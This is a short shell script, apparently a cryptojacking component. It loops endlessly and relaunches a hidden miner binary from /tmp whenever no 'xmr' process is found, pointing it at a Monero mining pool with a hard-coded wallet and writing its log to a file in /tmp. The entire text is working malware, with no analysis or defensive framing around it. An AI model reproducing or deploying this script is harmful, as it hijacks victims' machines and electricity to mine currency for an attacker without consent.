
while true
do
p1=`ps aux| grep 'xmr'| grep -v grep| awk '{print $1}'`
if [ -z $p1 ]; then
/tmp/rb -o stratum+tcp://pool.supportxmr.com:8080 -u 43APkxyS4CdbrtSYPdwpd1XqgSytGqXnPJZ5GZYRuAsFj4Vj6h5NvbDFouVZybZQe7Bs3yLPqTMEXTkzGB7EztL5Q9svWta -p 4000 -l /tmp/qrstu.txt
else
echo ""
fi
sleep 10
done